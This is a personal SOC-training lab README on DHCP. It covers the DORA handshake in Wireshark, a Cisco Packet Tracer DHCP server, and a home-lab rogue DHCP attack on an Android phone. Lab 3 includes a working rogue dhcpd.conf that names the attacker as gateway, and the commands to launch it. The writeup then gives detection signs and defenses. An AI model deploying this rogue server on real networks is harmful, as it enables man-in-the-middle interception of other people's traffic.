# 🧪 DHCP Practical Labs — Port 67/68

**Author:** Muhammad Awais Javed (Mian Awais) / **Date:** April 2026 / **Part of:** [SOC-Journey-2026](https://github.com/awaisjaved-soc/SOC-Journey-2026)

---

## 📌 Table of Contents

- [🎯 Objective](#-objective)
- [📖 What is DHCP? (quick recap)](#-what-is-dhcp-quick-recap)
- [⚙️ How It Works](#️-how-it-works)
- [🧪 Lab Environment](#-lab-environment)
- [💻 Commands Used](#-commands-used)
- [🔍 Wireshark Analysis](#-wireshark-analysis)
- [🚨 SOC Analyst Notes](#-soc-analyst-notes)
- [🛡️ MITRE ATT&CK](#️-mitre-attck)
- [📸 Screenshots](#-screenshots)
- [✅ Key Takeaways](#-key-takeaways)

> 📖 New to DHCP? Read the theory first: [`dhcp-explained`](../dhcp-explained/).

---

## 🎯 Objective

To see DHCP with my own eyes instead of just reading about it:

1. **Watch DORA happen live** — release and renew an IP on a real machine while Wireshark captures every packet.
2. **Build a DHCP server** on a Cisco router in Packet Tracer, serving two separate networks.
3. **Attack it** — stand up a rogue DHCP server and hijack a victim phone's gateway, then learn what that looks like from the defender's chair.

Each lab keeps its own notes in its subfolder:

| Lab | Folder |
|-----|--------|
| DORA in Wireshark | [`DHCP-DORA-process`](./DHCP-DORA-process/) |
| Cisco Packet Tracer DHCP server | [`DHCP-Lab-CiscoPacketTracer`](./DHCP-Lab-CiscoPacketTracer/) |
| Rogue DHCP attack (SOC focused) | [`DHCP-ROGUE`](./DHCP-ROGUE/) |

---

## 📖 What is DHCP? (quick recap)

**DHCP (Dynamic Host Configuration Protocol)** automatically assigns IP addresses and network settings to devices — no manual configuration. It runs over **UDP**: **port 67** on the server side, **port 68** on the client side.

What a lease contains: IP address, subnet mask, default gateway, DNS servers, and a lease time. Full theory: [`dhcp-explained`](../dhcp-explained/).

---

## ⚙️ How It Works

### 🔄 DORA — the four-step handshake (Lab 1)

1. **Discover** — client has no IP, so it broadcasts from `0.0.0.0` to `255.255.255.255`: *"Is there any DHCP server out there?"*
2. **Offer** — the server replies with an available IP (e.g. `192.168.100.52`), plus mask, gateway, DNS, and lease time.
3. **Request** — the client formally asks for the offered IP.
4. **Acknowledge (ACK)** — the server confirms; the client configures itself and is on the network.

In plain words: **Release** = "I'm done with this IP." **Renew** = "Please give me a new one." **DORA** = the conversation that makes it happen.

### 🖧 Cisco DHCP server (Lab 2)

A Cisco router can be the DHCP server itself: you define a **pool** per network (`network` + `default-router`), **exclude** addresses that are statically assigned (like the router's own interfaces), and clients on each interface get leases from the right pool.

### 😈 Rogue DHCP (Lab 3)

DHCP has no authentication — the client trusts the **first Offer** it receives. An attacker who answers faster than the legitimate server becomes the network's DHCP server and can hand out:
- a **malicious gateway** (the attacker's own IP → full man-in-the-middle), and
- a **malicious DNS server** (traffic redirection, phishing).

That's the whole attack: be faster than the real server.

---

## 🧪 Lab Environment

| Lab | Setup |
|-----|-------|
| **Lab 1 — DORA in Wireshark** | Live machine (Windows `ipconfig` / Linux) + Wireshark capturing the renew cycle |
| **Lab 2 — Cisco Packet Tracer** | Cisco router with interfaces `f0/0` = `192.168.100.1/24` and `f0/1` = `192.168.200.1/24`, two DHCP pools |
| **Lab 3 — Rogue DHCP** | Legitimate server: Kali VM PC (`192.168.100.91`) · Rogue server (attacker): Linux laptop (`192.168.100.90`) · Victim: Android phone · Tools: `isc-dhcp-server`, Wireshark |

---

## 💻 Commands Used

### Lab 1 — DORA in Wireshark

```cmd
ipconfig
```
Shows the current IP — the "before" picture. (Linux: `iwconfig` / `ip addr`.)

```cmd
ipconfig /release
```
Gives up the current IP. The machine sends a DHCP **Release**, the server frees the address, and the device drops to `0.0.0.0` — watch for it in Wireshark.

```cmd
ipconfig /renew
```
Triggers the full **DORA** handshake: Discover → Offer → Request → ACK, ending with a fresh lease.

### Lab 2 — Cisco Packet Tracer DHCP server

```ios
Router>en
Router#config t
```
Enter privileged mode, then global configuration mode.

```ios
Router(config)#hostname DHCP
```
Renames the router to `DHCP` — prompts in the rest of this lab use that name.

```ios
DHCP(config)#int f0/0
DHCP(config-if)#ip add 192.168.100.1 255.255.255.0
DHCP(config-if)#no sh
```
Assigns `192.168.100.1/24` to FastEthernet0/0 and brings the interface up (`no sh` = no shutdown).

```ios
DHCP(config-if)#int f0/1
DHCP(config-if)#ip add 192.168.200.1 255.255.255.0
DHCP(config-if)#no sh
```
Same for FastEthernet0/1 with `192.168.200.1/24` — the router now sits on two networks.

```ios
DHCP(config)#ip dhcp pool 192.168.100.1
DHCP(dhcp-config)#network 192.168.100.0 255.255.255.0
DHCP(dhcp-config)#default-router 192.168.100.1
DHCP(dhcp-config)#exit
```
Creates the DHCP pool for the `192.168.100.0/24` network and tells clients their gateway is `192.168.100.1`.

```ios
DHCP(config)#ip dhcp excluded-address 192.168.100.1
DHCP(config)#ip dhcp excluded-address 192.168.200.1
```
Excludes the router's own interface addresses from the pools — never hand out an address that's statically in use.

```ios
DHCP(config)#ip dhcp pool 192.168.200.1
DHCP(dhcp-config)#network 192.168.200.0 255.255.255.0
DHCP(dhcp-config)#default-router 192.168.200.1
DHCP(dhcp-config)#exit
```
Second pool for the `192.168.200.0/24` network with its own gateway.

```ios
DHCP#wr
```
Writes the running config to memory (`write`) — saves the lab so it survives a reload.

### Lab 3 — Rogue DHCP attack (on the attacker laptop, `192.168.100.90`)

```bash
sudo apt update
sudo apt install isc-dhcp-server -y
```
Installs the ISC DHCP server — the tool we turn into a rogue server.

```bash
sudo mkdir -p /var/lib/dhcp
sudo touch /var/lib/dhcp/dhcpd.leases
sudo chown -R root:root /var/lib/dhcp
sudo chmod 644 /var/lib/dhcp/dhcpd.leases
```
Prepares the lease database file the daemon needs before it will start.

```bash
sudo nano /etc/dhcp/dhcpd.conf
```
Opens the server configuration. The working rogue config:

```conf
subnet 192.168.100.0 netmask 255.255.255.0 {
  range 192.168.100.100 192.168.100.200;
  option routers 192.168.100.90;          # Attacker laptop as gateway  <-- the MITM
  option domain-name-servers 8.8.8.8;
  default-lease-time 600;
  max-lease-time 7200;
}
```
The critical line is `option routers 192.168.100.90` — every victim is told *the attacker* is the gateway.

```bash
sudo killall dhcpd
sudo dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid eth0 -d
```
Kills any running instance, then starts the rogue server in debug/foreground mode on `eth0`.

**On the victim phone:** forget the Wi-Fi network completely, toggle Wi-Fi OFF for 15–20 seconds, turn it back ON — repeat 4–6 times. The phone pulled a rogue IP from the `192.168.100.100–200` range with the attacker as its gateway.

---

## 🔍 Wireshark Analysis

**Display filter (all three labs):**
```
udp.port == 67 or udp.port == 68
```

**Lab 1 — what the normal handshake looks like:**

| Packet | Meaning |
|--------|---------|
| `Release` | Laptop gave up its old IP |
| `Discover` | Broadcast from `0.0.0.0` asking for a server |
| `Offer` | Server replied with an available IP |
| `Request` | Laptop asked to use that IP |
| `ACK` | Server confirmed the lease |

**Lab 3 — what the attack looks like:**

- DHCP **Discover** from the phone, then **Offers from BOTH servers** — legitimate and rogue.
- The phone accepted the **rogue Offer** (it answered first / won the race after the Wi-Fi was forgotten).
- Inside the rogue Offer/ACK, expand DHCP options: **Option 3 (router)** = `192.168.100.90` — the attacker's IP where the real gateway should be. That single field is the whole attack, visible in one packet.

---

## 🚨 SOC Analyst Notes

**How attackers abuse DHCP:**

- **Rogue DHCP → MITM.** Whoever answers the Discover first controls the victim's gateway and DNS. I proved this works against a real phone in Lab 3.
- **DHCP starvation.** Flooding Discovers with spoofed MACs drains the pool — new devices can't get IPs (DoS on onboarding).
- **Malicious DNS assignment.** Even without full MITM, attacker-controlled DNS (Option 6) enables phishing and silent redirection.

**What to monitor:**

- **Multiple Offers per Discover** — the #1 rogue-DHCP indicator. One Discover should get one Offer.
- **Gateway/DNS drift** — endpoints whose Option 3 or Option 6 no longer match the known-good values.
- **Leases from unexpected ranges** — e.g. phones suddenly in `192.168.100.100–200` when the legit pool is elsewhere.
- **Unknown DHCP servers** — any server MAC/IP that isn't documented infrastructure.

**Defenses:** DHCP snooping (switches only trust server messages on designated ports), Dynamic ARP Inspection, 802.1X/NAC.

---

## 🛡️ MITRE ATT&CK

| Technique | ID | Relevance |
|-----------|----|-----------|
| Adversary-in-the-Middle | **T1557** | Rogue DHCP makes the attacker the gateway — demonstrated live in Lab 3 |
| Network Denial of Service | **T1498** | DHCP starvation exhausts the address pool |
| DHCP Spoofing* | — | Rogue server impersonating legitimate infrastructure |

*DHCP-specific; mapped under T1557 in most threat models.

---

## 📸 Screenshots

| Capture | File |
|---------|------|
| DORA handshake in Wireshark (release → renew) | [`DHCP-DORA-process/dora-process.png`](./DHCP-DORA-process/dora-process.png) |
| Cisco Packet Tracer DHCP topology | [`DHCP-Lab-CiscoPacketTracer/dhcp-lab.png`](./DHCP-Lab-CiscoPacketTracer/dhcp-lab.png) |
| Victim phone holding the rogue lease | [`DHCP-ROGUE/attacked-device.jpeg`](./DHCP-ROGUE/attacked-device.jpeg) |

Detailed per-lab notes: [`DHCP-DORA-process/readme.md`](./DHCP-DORA-process/readme.md) · [`DHCP-Lab-CiscoPacketTracer/README.md`](./DHCP-Lab-CiscoPacketTracer/README.md) · [`DHCP-ROGUE/README.MD`](./DHCP-ROGUE/README.MD)

---

## ✅ Key Takeaways

- I watched the full DORA handshake live: `ipconfig /release` drops the machine to `0.0.0.0`, and `/renew` walks through Discover → Offer → Request → ACK in Wireshark.
- I built a working DHCP server on a Cisco router in Packet Tracer — two interfaces, two pools, excluded static addresses, config saved with `wr`.
- I ran a real rogue-DHCP attack: `isc-dhcp-server` on `192.168.100.90` handing out leases with the attacker as gateway, and a victim phone actually took the bait.
- The defender's lesson is one packet deep: a second Offer for one Discover, or an Option 3 gateway that isn't the real router, is the whole detection. DHCP snooping exists for exactly this reason.
